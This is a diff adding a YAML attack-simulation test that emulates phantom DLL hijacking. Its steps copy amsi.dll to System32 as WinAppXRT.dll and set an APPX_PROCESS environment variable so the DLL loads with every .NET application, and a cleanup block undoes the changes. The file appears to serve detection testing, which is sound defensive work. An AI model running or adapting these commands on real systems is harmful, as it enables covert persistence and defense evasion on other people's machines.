@@ -1,0 +1,30 @@
+api_version: "2.0"
+name: Phantom Dll Hijacking - WinAppXRT.dll
+description: ".NET components (a couple of DLLs loaded anytime .NET apps are executed) when they are loaded they look for an environment variable called APPX_PROCESS\nSetting the environmental variable and dropping the phantom WinAppXRT.dll in e.g. c:\\windows\\system32 (or any other location accessible via PATH) will ensure the \nWinAppXRT.dll is loaded everytime user launches an application using .NET.\n\nUpon successful execution, amsi.dll will be copied and renamed to WinAppXRT.dll and then WinAppXRT.dll will be copied to system32 folder for loading during execution of any .NET application.\n"
+uuid: 46ed938b-c617-429a-88dc-d49b5c9ffedb
+mitre:
+    tactics:
+        - 'TA0003: Persistence'
+        - 'TA0004: Privilege Escalation'
+        - 'TA0005: Defense Evasion'
+    techniques:
+        - 'T1574: Hijack Execution Flow'
+    subtechniques:
+        - 'T1574.001: DLL Search Order Hijacking'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: phantom-dll-hijacking---winappxrt.dll
+      inline: |
+        copy %windir%\System32\amsi.dll %APPDATA%\amsi.dll
+        ren %APPDATA%\amsi.dll WinAppXRT.dll
+        copy %APPDATA%\WinAppXRT.dll %windir%\System32\WinAppXRT.dll
+        reg add "HKEY_CURRENT_USER\Environment" /v APPX_PROCESS /t REG_EXPAND_SZ /d "1" /f
+      executor: command_prompt
+      cleanup:
+        inline: |
+            reg delete "HKEY_CURRENT_USER\Environment" /v APPX_PROCESS /f
+            del %windir%\System32\WinAppXRT.dll
+            del %APPDATA%\WinAppXRT.dll
+        executor: command_prompt
